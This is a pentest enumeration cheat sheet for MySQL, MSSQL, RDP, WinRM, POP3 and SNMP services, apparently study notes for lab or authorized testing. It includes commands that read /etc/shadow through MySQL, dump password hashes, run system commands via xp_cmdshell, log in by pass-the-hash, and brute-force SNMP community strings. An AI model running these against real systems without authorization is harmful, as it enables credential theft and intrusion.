# ENUM — MySQL (3306), RDP (3389), WinRM (5985), SNMP (161)

## MySQL — Puerto 3306
```bash
mysql -h <TARGET_IP> -u root
# show databases; | use <DB>; | select * from <TABLE>; | select load_file("/etc/shadow");

sudo nmap -p 3306 -sV -O <TARGET_IP>
nmap -p 3306 --script=mysql-empty-password <TARGET_IP>
nmap -p 3306 --script=mysql-users --script-args="mysqluser='<USER>',mysqlpass='<PW>'" <TARGET_IP>
nmap -p 3306 --script=mysql-dump-hashes --script-args="username='<USER>',password='<PW>'" <TARGET_IP>

use auxiliary/admin/mysql/mysql_enum
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mysql/mysql_hashdump
```

## MSSQL — Puerto 1433
```bash
nmap -p 1433 --script ms-sql-info <TARGET_IP>
nmap -p 1433 --script ms-sql-empty-password <TARGET_IP>
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=<USER>,mssql.password=<PW>,ms-sql-xp-cmdshell.cmd="ipconfig" <TARGET_IP>
```

## RDP (3389) / WinRM (5985) / POP3 (110) / SNMP (161)
```bash
xfreerdp /u:<USER> /p:<PASSWORD> /v:<TARGET_IP>:<PORT>

crackmapexec winrm <TARGET_IP> -u <USER> -p <PW>
evil-winrm -u <USER> -p <PASSWORD> -i <TARGET_IP>
evil-winrm -u <USER> -H <NTLM_HASH> -i <TARGET_IP>

nc -nv <IP> 110
# USER <username> | PASS <password> | LIST | RETR <n> | QUIT

onesixtyone -c /usr/share/wordlists/rockyou.txt <TARGET_IP>
snmpwalk -v 2c -c <COMMUNITY_STRING> <TARGET_IP>
```
